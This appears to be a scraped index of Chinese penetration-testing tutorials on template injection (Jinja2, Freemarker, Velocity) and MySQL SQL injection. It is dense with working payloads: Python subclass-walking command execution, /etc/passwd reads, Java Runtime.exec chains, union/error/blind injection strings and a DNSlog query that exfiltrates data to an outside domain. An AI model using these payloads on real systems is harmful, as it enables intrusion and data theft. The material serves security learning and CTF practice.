","date":"2022-01-20","objectID":"/%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/:2:4","tags":["表达式注入"],"title":"表达式注入初探","uri":"/%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/"},{"categories":["渗透测试"],"content":"参考文章 (57条消息) Java 安全-手把手教你SPEL表达式注入_4ct10n-CSDN博客_spel表达式注入 Spring-data-commons(CVE-2018-1273)漏洞分析 - FreeBuf网络安全行业门户 ","date":"2022-01-20","objectID":"/%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/:3:0","tags":["表达式注入"],"title":"表达式注入初探","uri":"/%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/"},{"categories":["渗透测试"],"content":"简介 ssti（Server-SIde Template Injection，服务端模板注入），模板引擎支持使用静态模板文件，在运行时HTML页面中的实际值替换为变量/占位符，从而让HTML的开发变得更容易。 ssti主要为python的一些框架 jinja2 mako tornado django，PHP框架smarty twig，java框架jade velocity freeMarker XMLTemplate Smarty4j 等等使用了渲染函数时，由于代码不规范或信任了用户输入而导致了服务端模板注入，模板渲染其实并没有漏洞，主要是程序员对代码不规范不严谨造成了模板注入漏洞，造成模板可控。 ","date":"2022-01-20","objectID":"/ssti%E6%9C%8D%E5%8A%A1%E7%AB%AF%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/:1:0","tags":["SSTI","服务端模板注入","代码审计"],"title":"SSTI服务端模板注入","uri":"/ssti%E6%9C%8D%E5%8A%A1%E7%AB%AF%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/"},{"categories":["渗透测试"],"content":"Flask的Jinja2 CTF赛题中以python下的SSTI居多 Flask是一个使用Python编写的轻量级web应用框架，其WSGI工具箱采用Werkzeug，模板引擎则使用Jinja2。 {% raw %} 基本语法，使用{{}}如下： \u003ch1\u003eHello, {{user.name}}!\u003c/h1\u003e {% endraw %} 漏洞成因： 两种渲染给前端的代码的形式是， 1.一种当字符串来渲染并且使用了%(request.url)，此方法存在漏洞 def test(): template = ''' \u003cdiv class=\"center-content error\"\u003e \u003ch1\u003eOops! That page doesn't exist.\u003c/h1\u003e \u003ch3\u003e%s\u003c/h3\u003e \u003c/div\u003e ''' %(request.url) 2.另一种规范使用index.html渲染文件。 @app.route('/') @app.route('/index')#我们访问/或者/index都会跳转 def index(): return render_template(\"index.html\",title='Home',user=request.args.get(\"key\")) {% raw %} 由上两种功能方法，我们发现漏洞代码(第一种方法)使用了render_template_string函数，而如果我们使用第二种render_template函数，将变量传入进去，现在即使我们写成了request，我们可以在url里写自己想要的恶意代码{{}}你将会发现：即使输入参数可控了，但是代码已经并不生效。因为，良好的代码规范，使得模板其实已经固定了，已经被render_template渲染了。你的模板渲染其实已经不可控了。 而第一种漏洞代码的问题出在这里，如下：注意%(request.url)，有的程序员因为省事并不会专门写一个html文件，而是直接当字符串来渲染。并且request.url是可控的，这也正是flask在CTF中经常使用的手段，报错404，返回当前错误url，通常CTF的flask如果是ssti，那么八九不离十就是基于这段代码，多的就是一些过滤和一些奇奇怪怪的方法函数。 {% endraw %} CTF **内建函数：**当我们启动一个python解释器时，及时没有创建任何变量或者函数，还是会有很多函数可以使用，我们称之为内建函数。 dir()函数用于向我们展示一个对象的属性有哪些，在没有提供对象的时候，将会提供当前环境所导入的所有模块。 python中，object类是Python中所有类的基类，如果定义一个类时没有指定继承哪个类，则默认继承object类。 instance.__class__可以获取当前实例的类对象 instance.__class.____bases__可以查看其基类 instance.__class__.mro获取当前类对象的所有继承类’只是这时会显示出整个继承链的关系，是一个列表，object在最底层故在列表中的最后，通过__mro__[-1]可以获取到 subclasses() 返回的是这个类的子类的集合。python中的类都是继承object的，所以只要调用object类对象的__subclasses__()方法就可以获取我们想要的类的对象，比如用于读取文件的file对象。 比如可以发现在第四十号指向file类，所以就可以从file类中调用open方法 ''.__class__.__mro__[-1].__subclasses__()[40](\"/home/xps/test/ssti/flag.txt\").read() # 这里成功利用file对象的匿名实例化，并为其传参要读取的文件名，通过调用其读文件函数read就可以对文件进行读取了 {% raw %} \"\"\" # __calss__ print(\"\".__class__) # 返回了\u003cclass 'str'\u003e，对于一个空字符串他已经打印了str类型 # __bases__ # 每个类都有一个bases属性，列出其基类如下 print(\"\".__class__.__bases__) # 打印返回(\u003cclass 'object'\u003e,) # mro # 我们想要寻找object类的不仅仅只有bases，同样可以使用mro，mro给出了method resolution order，即【解析方法调用的顺序】。如下 \u003e\u003e\u003e print(\" \".__class__.__mro__) (\u003cclass 'str'\u003e, \u003cclass 'object'\u003e) # 正是由于这些但不仅限于这些方法，我们才有了各种沙箱逃逸的姿势 # 在flask ssti中poc中很大一部分是从object类中寻找我们可利用的类的方法。我们这里只举例最简单的。接下来我们增加代码。接下来我们使用subclasses,subclasses() 这个方法，这个方法返回的是这个类的子类的集合，也就是object类的子类的集合。 # subclasses() 返回的是这个类的子类的集合 print(\" \".__class__.__bases__[0].__subclasses__()) # 需要自己寻找合适的标号来调用接下来我将进一步解释 # 接下来就是我们需要找到合适的类，然后从合适的类中寻找我们需要的方法 # 通过我们在如上这么多类中一个一个查找，找到我们可利用的类，这里举例一种。\u003cclass 'os._wrap_close'\u003e，os命令相信你看到就感觉很亲切。我们正是要从这个类中寻找我们可利用的方法，通过大概猜测找到是第119个类，0也对应一个类，所以这里写[118]。 {{\" \".__class__.__bases__[0].__subclasses__()[118]}} # 这个时候我们便可以利用.init.globals来找os类下的，init初始化类，然后globals全局来查找所有的方法及变量及参数。 {{\" \".__class__.__bases__[0].__subclasses__()[118].__init__.__globals__}} # 此时我们可以在网页上看到各种各样的参数方法函数。我们找其中一个可利用的function popen，在python2中可找file读取文件，很多可利用方法，详情可百度了解下。 {{\" \".__class__.__bases__[0].__subclasses__()[118].__init__.__globals__['popen']('dir').read()}} # 此时便可以看到命令已经执行。如果是在linux系统下便可以执行其他命令。此时我们已经成功得到权限。 \"\"\" {% endraw %} 执行任意命令的payload: {% for c in [].__class__.__base__.__subclasses__() %} {% if c.__name__ == 'catch_warnings' %} {% for b in c.__init__.__globals__.values() %} {% if b.__class__ == {}.__class__ %} {% if 'eval' in b.keys() %} {{ b['eval']('__import__(\"os\").popen(\"ls\").read()') }} # poppen的参数就是要执行的命令 {% endif %} {% endif %} {% endfor %} {% endif %} {% endfor %} 读取密码 ''.__class__.__mro__[-1].__subclasses__()[40](\"/etc/passwd\").read() 命令执行: 1.os.system() 用法：os.system(command) 但是用这个无法回显 2.os.popen() 我们可以用这个 用法：os.popen(command[,mode[,bufsize]]) 说明：mode – 模式权限可以是 ‘r’(默认) 或 ‘w’。 popen方法通过p.read()获取终端输出，而且popen需要关闭close().当执行成功时，close()不返回任何值，失败时，close()返回系统返回值（失败返回1），可见它获取返回值的方式和os.system不同。 还需要了解一个魔法函数：globals，该属性是函数特有的属性,记录当前文件全局变量的值,如果某个文件调用了os、sys等库,但我们只能访问该文件某个函数或者某个对象，那么我们就可以利用globals属性访问全局的变量。该属性保存的是函数全局变量的字典引用 ().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.values()[13]['eval']('__import__(\"os\").popen(\"ls \").read()' ) 3.subprocess 如果os被过滤了可以用subprocess 1.subprocess.check_call() Python 2.5中新增的函数。 执行指定的命令，如果执行成功则返回状态码，否则抛出异常。其功能等价于subprocess.run(…, check=True)。 2.subprocess.check_output() Python 2.7中新增的的函数。执行指定的命","date":"2022-01-20","objectID":"/ssti%E6%9C%8D%E5%8A%A1%E7%AB%AF%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/:1:1","tags":["SSTI","服务端模板注入","代码审计"],"title":"SSTI服务端模板注入","uri":"/ssti%E6%9C%8D%E5%8A%A1%E7%AB%AF%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/"},{"categories":["渗透测试"],"content":"Java的Freemarker Freemarker模板语言(FTL) 1.内建函数的利用 2.new函数的利用 new函数可以创建一个继承自freemarker.template.TemplateModel类的实例。 查阅代码发现freemarker.template.utility.Execute#exec可以自行任意代码，因此可以通过new函数实例化一个Execute对象并执行exec()方法造成任意代码执行。 Payload： \u003c#assign value=\"freemarker.template.utility.Execute\"?new()\u003e$(value(\"calc.exe\"))\u003e freemarker.template.utility包中三个类都可以被用来执行代码： ObjectConstructor JythonRuntime Execute OFCMS1.1.2版本的注入漏洞就是采用的Freemarker 3.api函数的利用 api函数可以用来访问java api，使用方法为：value?api.someJavaMethod(),相当于value.someJavaMethod()。因此可以利用api函数通过getClassLoader来获取一个类加载器，进而加载恶意类。也可以通过getResource来读取服务器上的资源文件 \u003c#assign classLoader=object?api.class.getClassLoader()\u003e $(classLoader.loadClass(\"Evil.class\")) 防御： 从2.3.22版本开始，api_builtin_enabled的默认值为false，这意味着api内家函数从此之后不能随意使用； 官方还提供了3个预定义的解析器来限制new函数对类的访问： USRESTRICTED_RESOLVER SAFER_RESOLVER ALLOW_NOTHING_RESOLVER ","date":"2022-01-20","objectID":"/ssti%E6%9C%8D%E5%8A%A1%E7%AB%AF%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/:1:2","tags":["SSTI","服务端模板注入","代码审计"],"title":"SSTI服务端模板注入","uri":"/ssti%E6%9C%8D%E5%8A%A1%E7%AB%AF%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/"},{"categories":["渗透测试"],"content":"Java的Velovity模板引擎 在Java中，Velovity使用的较多，简单介绍一下Velovity的基本语法和RCE方法。 在Velovity中，用#来表示Velovity的脚步语句，比如#set,#if,#foreach等 #if($msg.img) \u003cimg src=$msg.imgs border=0\u003e #else \u003cimg src=\"a.jpg\"\u003e #end $在Velovity中标识一个对象。根据SpEL表达式注入的知识，我们知道一旦可以调用对象，便有办法来构造命令执行语句： $e.getClass().forName(\"java.lang.Runtime\").getMethod(\"getRuntime\", null).invoke(null, null).exec() 在使用Velovity模板注入中，如果无法进行名住，我们可以修改Cookie来进行权限升级： $session.setAttribute(\"IS_ADMIN\", \"1\") 在漏洞不存在回显的时候，并且容器为Tomcat7的时候，可以通过如下方法来构造一个有回显的命令执行： #set($str=$class.inspect(\"java.lang.String\").type #set($cstr=$class.inspect(\"java.lang.Character\").type #set($ex=$class.inspect(\"java.lang.Runtime\").type.getRuntime().exec(\"whoami\") $ex.waitFor() #set($out=$ex.getInputStream()) #foreach(Si in [1..$out.available()]) $str.valueOf($chr.toChars($out.read())) #end 代码审计的时候，搜索模板引擎的相关关键字即可 ","date":"2022-01-20","objectID":"/ssti%E6%9C%8D%E5%8A%A1%E7%AB%AF%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/:1:3","tags":["SSTI","服务端模板注入","代码审计"],"title":"SSTI服务端模板注入","uri":"/ssti%E6%9C%8D%E5%8A%A1%E7%AB%AF%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/"},{"categories":["渗透测试"],"content":"漏洞防御 避免用户能够直接控制模板的熟并对其进行过滤 如需要向用户公开模板编辑，则可以选择无逻辑的模板引擎，如Handlebars、Moustache等 ","date":"2022-01-20","objectID":"/ssti%E6%9C%8D%E5%8A%A1%E7%AB%AF%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/:2:0","tags":["SSTI","服务端模板注入","代码审计"],"title":"SSTI服务端模板注入","uri":"/ssti%E6%9C%8D%E5%8A%A1%E7%AB%AF%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/"},{"categories":["渗透测试"],"content":"参考 ssti注入 - MuRKuo - 博客园 (cnblogs.com) SSTI（模板注入）基础总结 - 简书 (jianshu.com) SSTI/沙盒逃逸详细总结 - 安全客，安全资讯平台 (anquanke.com) ","date":"2022-01-20","objectID":"/ssti%E6%9C%8D%E5%8A%A1%E7%AB%AF%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/:3:0","tags":["SSTI","服务端模板注入","代码审计"],"title":"SSTI服务端模板注入","uri":"/ssti%E6%9C%8D%E5%8A%A1%E7%AB%AF%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/"},{"categories":["渗透测试"],"content":"简介 SQL注入攻击是黑客利用SQL注入对数据库进行攻击的常用手段之一。攻击者通过浏览器或其他客户端将恶意SQL语句插入到网站参数中，网站应用程序未经过滤，便将SQL语句带入数据库执行。SQL注入过程如图所示。 分类 ","date":"2022-01-19","objectID":"/sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:0:0","tags":["SQL注入","代码审计"],"title":"SQL注入漏洞","uri":"/sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":["渗透测试"],"content":"按类型： ","date":"2022-01-19","objectID":"/sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:1:0","tags":["SQL注入","代码审计"],"title":"SQL注入漏洞","uri":"/sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":["渗透测试"],"content":"1.数字型 输入的参数x为整型的时候，通常sql语句是这样的 select * from users where id =x 这种类型可以使用经典的and 1=1 和 and 1=2来判断 原因： 当输入and 1=1时，后台会执行sql语句是 select * from users where id =x and 1=1； 没有语法显示错误且，返回正常 当输入and 1=2时，后台会执行sql语句是 select * from users where id =1 and 1=2; 没有语法错误且，返回错误 我们在使用假设： 如果是字符型注入的话，我们输入的语句应该会出现这样的状况 select * from users where id ='1 and 1=1'; select * from users where id ='1 and 1=2'; 查询语句将and语句全部转换成字符串，并没有进行and的逻辑判断，所以不会出现以上结果，所以这个等式是不成立的。 ","date":"2022-01-19","objectID":"/sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:1:1","tags":["SQL注入","代码审计"],"title":"SQL注入漏洞","uri":"/sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":["渗透测试"],"content":"2.字符型 当输入的参数x为字符型时，通常sql语句会这样的 select * from users where id ='x' 这种类型我们可以使用and ‘1’=‘1 和 and ‘1’=‘2来进行测试 原因： 当输入and ‘1’=‘1的时候，后台执行的语句是 select * from users where id='x' and '1'='1' 语法正确，逻辑判断正确，返回正确 当输入and ‘1’=‘2的时候，后台执行的语句是 select * from users where id='x' and '1'='2' 语法正确，逻辑判断错误，返回错误 字符型和数字型最大的一个区别在于，数字型不需要单引号来闭合，而字符串一般需要通过单引号来闭合的。 ","date":"2022-01-19","objectID":"/sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:1:2","tags":["SQL注入","代码审计"],"title":"SQL注入漏洞","uri":"/sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":["渗透测试"],"content":"按执行效果分类 下面那些： 报错 盲注 联合 。。。 MySQL注入 主要内容以MySQL为例进行说明，其他数据库类似，只做简单介绍，具体操作以MySQL类推即可 Docker下载sqli-labs: docker pull acgpiano/sqli-labs docker images docker run -dt --name sqli acgpiano/sqli-labs -p 80:80 --rm acgpiano/sqli-labs # docker 的80映射到本地, docker环境停止之后，删除所有创建的镜像 docker exec -it c351ff0ff80f /bin/bash # 进入容器 docker stop \u003cContainerId(或者name)\u003e # 删除容器 docker rm 删除镜像 docker rmi MySQL5.0之后增加了information_schema # information_schema数据库表说明: 1、SCHEMATA表：提供了当前mysql实例中所有数据库的信息。是show databases的结果取之此表。 2、TABLES表：提供了关于数据库中的表的信息（包括视图）。详细表述了某个表属于哪个schema，表类型，表引擎，创建时间等信息。是show tables from schemaname的结果取之此表。 3、COLUMNS表：提供了表中的列信息。详细表述了某张表的所有列以及每个列的信息。是show columns from schemaname.tablename的结果取之此表。 4、STATISTICS表：提供了关于表索引的信息。是show index from schemaname.tablename的结果取之此表。 5、USER_PRIVILEGES（用户权限）表：给出了关于全程权限的信息。该信息源自mysql.user授权表。是非标准表。 6、SCHEMA_PRIVILEGES（方案权限）表：给出了关于方案（数据库）权限的信息。该信息来自mysql.db授权表。是非标准表。 7、TABLE_PRIVILEGES（表权限）表：给出了关于表权限的信息。该信息源自mysql.tables_priv授权表。是非标准表。 8、COLUMN_PRIVILEGES（列权限）表：给出了关于列权限的信息。该信息源自mysql.columns_priv授权表。是非标准表。 9、CHARACTER_SETS（字符集）表：提供了mysql实例可用字符集的信息。是SHOW CHARACTER SET结果集取之此表。 10、COLLATIONS表：提供了关于各字符集的对照信息。 11、COLLATION_CHARACTER_SET_APPLICABILITY表：指明了可用于校对的字符集。这些列等效于SHOW COLLATION的前两个显示字段。 12、TABLE_CONSTRAINTS表：描述了存在约束的表。以及表的约束类型。 13、KEY_COLUMN_USAGE表：描述了具有约束的键列。 14、ROUTINES表：提供了关于存储子程序（存储程序和函数）的信息。此时，ROUTINES表不包含自定义函数（UDF）。名为“mysql.proc name”的列指明了对应于INFORMATION_SCHEMA.ROUTINES表的mysql.proc表列。 15、VIEWS表：给出了关于数据库中的视图的信息。需要有show views权限，否则无法查看视图信息。 16、TRIGGERS表：提供了关于触发程序的信息。必须有super权限才能查看该表 ","date":"2022-01-19","objectID":"/sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:2:0","tags":["SQL注入","代码审计"],"title":"SQL注入漏洞","uri":"/sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":["渗透测试"],"content":"注入流程 1.判断是否存在注入 ?id=1' and '1'='1 2.判断列数 ?id=1' order by 4--+ # 5的时候不显示，4的时候显示正常就是4列 3.数据库名 ?id=0' union select 1,2,3,database()--+ 4.根据数据库查数据表名 ?id=0' union select 1,2,3,group_concat(table_name) from information_schema.tables where table_schema=database() --+ 5.根据表名查列名 ?id=0' union select 1,2,3,group_concat(column_name) from information_schema.clumns where table_name='前面查出来的表名' and table_schema=database() --+ 6.数据 ?id=0' union select 1,2,3,group_concat(password) from users --+ ","date":"2022-01-19","objectID":"/sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:3:0","tags":["SQL注入","代码审计"],"title":"SQL注入漏洞","uri":"/sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":["渗透测试"],"content":"联合注入 ?id=1' order by 4--+ ?id=0' union select 1,2,3,database()--+ ?id=0' union select 1,2,3,group_concat(table_name) from information_schema.tables where table_schema=database() --+ ?id=0' union select 1,2,3,group_concat(column_name) from information_schema.columns where table_name=\"users\" --+ #group_concat(column_name) 可替换为 unhex(Hex(cast(column_name+as+char)))column_name ?id=0' union select 1,2,3,group_concat(password) from users --+ #group_concat 可替换为 concat_ws(',',id,users,password ) ?id=0' union select 1,2,3,password from users limit 0,1--+ ","date":"2022-01-19","objectID":"/sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:4:0","tags":["SQL注入","代码审计"],"title":"SQL注入漏洞","uri":"/sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":["渗透测试"],"content":"报错注入 # 1.floor() select * from test where id=1 and (select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a); # 2.extractvalue() select * from test where id=1 and (extractvalue(1,concat(0x7e,(select user()),0x7e))); # 3.updatexml() select * from test where id=1 and (updatexml(1,concat(0x7e,(select user()),0x7e),1)); # 4.geometrycollection() select * from test where id=1 and geometrycollection((select * from(select * from(select user())a)b)); # 5.multipoint() select * from test where id=1 and multipoint((select * from(select * from(select user())a)b)); # 6.polygon() select * from test where id=1 and polygon((select * from(select * from(select user())a)b)); # 7.multipolygon() select * from test where id=1 and multipolygon((select * from(select * from(select user())a)b)); # 8.linestring() select * from test where id=1 and linestring((select * from(select * from(select user())a)b)); # 9.multilinestring() select * from test where id=1 and multilinestring((select * from(select * from(select user())a)b)); # 10.exp() select * from test where id=1 and exp(~(select * from(select user())a)); **exp() 报错的原理：**exp 是一个数学函数，取e的x次方，当我们输入的值大于709就会报错，然后 ~ 取反它的值总会大于709，所以报错。 **updatexml() 报错的原理：**由于 updatexml 的第二个参数需要 Xpath 格式的字符串，以 ~ 开头的内容不是 xml 格式的语法，concat() 函数为字符串连接函数显然不符合规则，但是会将括号内的执行结果以错误的形式报出，这样就可以实现报错注入了。 floor()报错的原理：Floor报错原理分析 - ka1n4t - 博客园 (cnblogs.com) 爆库： ?id=1' and updatexml(1,(select concat(0x7e,(schema_name),0x7e) from information_schema.schemata limit 2,1),1) -- + 爆表： ?id=1' and updatexml(1,(select concat(0x7e,(table_name),0x7e) from information_schema.tables where table_schema='security' limit 3,1),1) -- + 爆字段： ?id=1' and updatexml(1,(select concat(0x7e,(column_name),0x7e) from information_schema.columns where table_name=0x7573657273 limit 2,1),1) -- + 爆数据： ?id=1' and updatexml(1,(select concat(0x7e,password,0x7e) from users limit 1,1),1) -- + #concat 也可以放在外面 updatexml(1,concat(0x7e,(select password from users limit 1,1),0x7e),1) 这里需要注意的是它加了连接字符，导致数据中的 md5 只能爆出 31 位，这里可以用分割函数分割出来： substr(string string,num start,num length); #string为字符串,start为起始位置,length为长度 ?id=1' and updatexml(1,concat(0x7e, substr((select password from users limit 1,1),1,16),0x7e),1) -- + ","date":"2022-01-19","objectID":"/sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:5:0","tags":["SQL注入","代码审计"],"title":"SQL注入漏洞","uri":"/sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":["渗透测试"],"content":"盲注 场景：无回显，并且没有报错和其他显示。且如果能用布尔就不用延迟 几个相关函数： regexp regexp '^xiaodi[a-z]' 匹配xiaodi及xiaodi...等 if if(条件,5,0) 条件成立 返回5 反之 返回0 sleep sleep(5) SQL语句延时执行5秒 mid mid(a,b,c)从位置 b 开始， 截取 a 字符串的 c 位 substr substr(a,b,c)从 b 位置开始， 截取字符串 a 的 c 长度 left left(database(),1)，database()显示数据库名称， left(a,b)从左侧截取 a 的前 b 位 length length(database())=8，判断数据库database()名的长度 ord=ascii ascii(x)=101，判断x的ascii码是否等于101，即email中的字母e IFNULL() 函数用于判断第一个表达式是否为 NULL，如果为 NULL 则返回第二个参数的值，如果不为 NULL 则返回第一个参数的值。 CAST()和CONVERT()函数可用来获取一个类型的值，并产生另一个类型的值。两者具体的语法如下：CAST(value as type); CONVERT(value, type); ","date":"2022-01-19","objectID":"/sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:6:0","tags":["SQL注入","代码审计"],"title":"SQL注入漏洞","uri":"/sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":["渗透测试"],"content":"时间注入 时间盲注也叫延时注入, 一般用到函数 sleep(), BENCHMARK(),还可以使用笛卡尔积(尽量不要使用,内容太多会很慢很慢) 一般时间盲注我们还需结合条件判断函数： #if（expre1，result1，result2） 当 expre1 为 true 时，返回 result1，false 时，返回 result2 #盲注的同时也配合着 mysql 提供的分割函数：substr、substring、left 一般喜欢把分割的函数编码一下，当然不编码也行，编码的好处就是可以不用引号，常用到的就有： ascii(), hex() 等等 ?id=1' and if(ascii(substr(database(),1,1))\u003e115,1,sleep(5))--+ ?id=1' and if((substr((select user()),1,1)='r'),sleep(5),1)--+ 步骤跟正常注入一样，只不过是逐位判断ascii码，如果为某个值，就sleep延时几秒的方式。 ","date":"2022-01-19","objectID":"/sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:6:1","tags":["SQL注入","代码审计"],"title":"SQL注入漏洞","uri":"/sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":["渗透测试"],"content":"布尔盲注 ?id=1' and substr((select user()),1,1)='r' -- + ?id=1' and IFNULL((substr((select user()),1,1)='r'),0) -- + #如果 IFNULL 第一个参数的表达式为 NULL，则返回第二个参数的备用值，不为 Null 则输出值 ?id=1' and strcmp((substr((select user()),1,1)='r'),1) -- + #若所有的字符串均相同，STRCMP() 返回 0，若根据当前分类次序，第一个参数小于第二个，则返回 -1 ，其它情况返回 ","date":"2022-01-19","objectID":"/sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:6:2","tags":["SQL注入","代码审计"],"title":"SQL注入漏洞","uri":"/sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":["渗透测试"],"content":"DNSlog注入 解决了盲注不能回显数据，效率低的问题 前提： 需要高权限 需要是Windows系统 工具： http://ceye.io/ 或者其他DNSlog平台 工具，如：https://github.com/ADOOO/DnslogSqlinj 使用语句： http://127.0.0.1:8080/sqlilabs/less-2/?id=-1 and if((select load_file(concat('\\\\\\\\',(select version()),'.1t7i2f.ceye.io\\\\abc'))),1,0)--+ # 使用load_file函数，里面带上我们dns log平台的域名， 然后在平台的DNSQuery里面看到结果 ","date":"2022-01-19","objectID":"/sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:6:3","tags":["SQL注入","代码审计"],"title":"SQL注入漏洞","uri":"/sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":["渗透测试"],"content":"insert,delete,update insert,delete,update 主要是用到盲注和报错注入，此类注入点不建议使用 sqlmap 等工具，会造成大量垃圾数据，一般这种注入会出现在 注册、ip头、留言板等等需要写入数据的地方,同时这种注入不报错一般较难发现，我们可以尝试性插入 引号、双引号、转义符 \\ 让语句不能正常执行，然后如果插入失败，更新失败，然后深入测试确定是否存在注入 ","date":"2022-01-19","objectID":"/sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:7:0","tags":["SQL注入","代码审计"],"title":"SQL注入漏洞","uri":"/sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":["渗透测试"],"content":"报错 mysql\u003e insert into admin (id,username,password) values (2,\"or updatexml(1,concat(0x7e,(version())),0) or\",\"admin\"); Query OK, 1 row affected (0.00 sec) mysql\u003e select * from admin; +------+-----------------------------------------------+----------+ | id | username | password | +------+-----------------------------------------------+----------+ | 1 | admin | admin | | 1 | and 1=1 | admin | | 2 | or updatexml(1,concat(0x7e,(version())),0) or | admin | +------+-----------------------------------------------+----------+ 3 rows in set (0.00 sec) mysql\u003e insert into admin (id,username,password) values (2,\"\"or updatexml(1,concat(0x7e,(version())),0) or\"\",\"admin\"); ERROR 1105 (HY000): XPATH syntax error: '~5.5.53' #delete 注入很危险，很危险，很危险，切记不能使用 or 1=1 ，or 右边一定要为false mysql\u003e delete from admin where id =-2 or updatexml(1,concat(0x7e,(version())),0); ERROR 1105 (HY000): XPATH syntax error: '~5.5.53' ","date":"2022-01-19","objectID":"/sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:7:1","tags":["SQL注入","代码审计"],"title":"SQL注入漏洞","uri":"/sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":["渗透测试"],"content":"盲注 #int型 可以使用 运算符 比如 加减乘除 and or 异或 移位等等 mysql\u003e insert into admin values (2+if((substr((select user()),1,1)='r'),sleep(5),1),'1',\"admin\"); Query OK, 1 row affected (5.00 sec) mysql\u003e insert into admin values (2+if((substr((select user()),1,1)='p'),sleep(5),1),'1',\"admin\"); Query OK, 1 row affected (0.00 sec) #字符型注意闭合不能使用and mysql\u003e insert into admin values (2,''+if((substr((select user()),1,1)='p'),sleep(5),1)+'',\"admin\"); Query OK, 1 row affected (0.00 sec) mysql\u003e insert into admin values (2,''+if((substr((select user()),1,1)='r'),sleep(5),1)+'',\"admin\"); Query OK, 1 row affected (5.01 sec) # delete 函数 or 右边一定要为 false mysql\u003e delete from admin where id =-2 or if((substr((select user()),1,1)='r4'),sleep(5),0); Query OK, 0 rows affected (0.00 sec) mysql\u003e delete from admin where id =-2 or if((substr((select user()),1,1)='r'),sleep(5),0); Query OK, 0 rows affected (5.00 sec) #update 更新数据内容 mysql\u003e select * from admin; +------+----------+----------+ | id | username | password | +------+----------+----------+ | 2 | 1 | admin | | 2 | 1 | admin | | 2 | 1 | admin | | 2 | admin | admin | +------+----------+----------+ 4 rows in set (0.00 sec) mysql\u003e update admin set id=\"5\"+sleep(5)+\"\" where id=2; Query OK, 4 rows affected (20.00 sec) Rows matched: 4 Changed: 4 Warnings: 0 ","date":"2022-01-19","objectID":"/sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:7:2","tags":["SQL注入","代码审计"],"title":"SQL注入漏洞","uri":"/sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":["渗透测试"],"content":"二次注入 二次注入的语句：在没有被单引号包裹的sql语句下，我们可以用16进制编码，这样就不会带有单引号等。 mysql\u003e insert into admin (id,name,pass) values ('3',0x61646d696e272d2d2b,'11'); Query OK, 1 row affected (0.00 sec) mysql\u003e select * from admin; +----+-----------+-------+ | id | name | pass | +----+-----------+-------+ | 1 | admin | admin | | 2 | admin'111 | 11111 | | 3 | admin'--+ | 11 | +----+-----------+-------+ 4 rows in set (0.00 sec) ","date":"2022-01-19","objectID":"/sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:8:0","tags":["SQL注入","代码审计"],"title":"SQL注入漏洞","uri":"/sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":["渗透测试"],"content":"宽字节注入 宽字节注入：针对目标做了一定的防护，单引号转变为 \\' , mysql 会将 \\ 编码为 %5c ，宽字节中两个字节代表一个汉字，所以把 %df 加上 %5c 就变成了一个汉字“運”，使用这种方法成功绕过转义，就是所谓的宽字节注入 id=-1%df' union select... #没使用宽字节%27 -\u003e %5C%27 #使用宽字节%df%27 -\u003e %df%5c%27 -\u003e 運' 